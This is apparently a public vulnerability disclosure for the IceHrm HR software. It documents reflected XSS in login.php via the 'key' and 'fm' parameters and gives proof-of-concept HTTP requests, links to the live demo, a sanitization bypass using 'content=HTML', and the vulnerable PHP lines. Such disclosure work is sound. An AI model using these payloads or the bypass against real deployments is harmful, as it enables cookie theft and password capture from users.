| Important note : This vulnerability was reported to the maintainers on **Nov 23rd, 2021**, and there has been no response yet. So, I infer it makes sense to publish it publicly here for the good sake of everyone who is using this software actively. Description DOM XSS in login.php GET parameter `key`. The input to `key` GET parameter is unsanitized as required for the context (javascript context ), and gets reflected in the DOM. Proof of ConceptOccurrence 1 : Request param `key` Request:  ``` GET /login.php?key=%27;alert(document.cookie)// HTTP/1.1 Host: icehrmpro.gamonoid.com User-Agent: Mozilla/5.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Alt-Used: icehrmpro.gamonoid.com Connection: keep-alive Cookie: PHPSESSID=6jua1ee8xx4s4cqcl3xxx9itr7;  Upgrade-Insecure-Requests: 1   ```  Follow the link : <https://icehrmpro.gamonoid.com/login.php?key=%27;alert(document.cookie)//> to test this vulnerability on the live demo version of the website. Occurence 2 : Request param `fm` The payload passed `fm` gets sanitized by PHP code. This could be bypassed by adding an extra GET param `content` with the value `HTML`. Thus backend will not sanitize any user input.  ``` GET /login.php?f=boo&fm=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E&content=HTML HTTP/1.1 Host: icehrmpro.gamonoid.com User-Agent: Mozilla/5.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Alt-Used: icehrmpro.gamonoid.com Connection: keep-alive Cookie: PHPSESSID=6jua1ee8qu4s4cqcl3gqm9itr7; _ga=GA1.2.267929257.1637661597; _gid=GA1.2.561894500.1637661597 Upgrade-Insecure-Requests: 1  ```  Follow the link : <https://icehrmpro.gamonoid.com/login.php?f=boo&fm=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E&content=HTML> to test this vulnerability on the live demo version of the website. Impact This vulnerability is capable of script execution on the victim's browser. It's possible to run a **keylogger** script and **capture password** of the victim user who tries to login by typing in thier credentials. References <https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting> Occurrences     HTML sanitization can be bypassed with an extra `content=HTML` GET param  <https://github.com/gamonoid/icehrm/blob/master/core/login.php#L357-L361>         [icehrm/core/login.php](https://github.com/gamonoid/icehrm/blob/f44b9ec8dd60f42c9e94ac78c55d82244b74b4db/core/login.php#L213-L219)  Lines 213 to 219 in [f44b9ec](/gamonoid/icehrm/commit/f44b9ec8dd60f42c9e94ac78c55d82244b74b4db)   |  | <script type="text/javascript"> | | --- | --- | |  | var key = ""; | |  | <?php if (isset($\_REQUEST['key'])) {?> | |  | key = '<?=$\_REQUEST['key']?>'; | |  | key = key.replace(/ /g,"+"); | |  | <?php }?> | |  | </script> | |
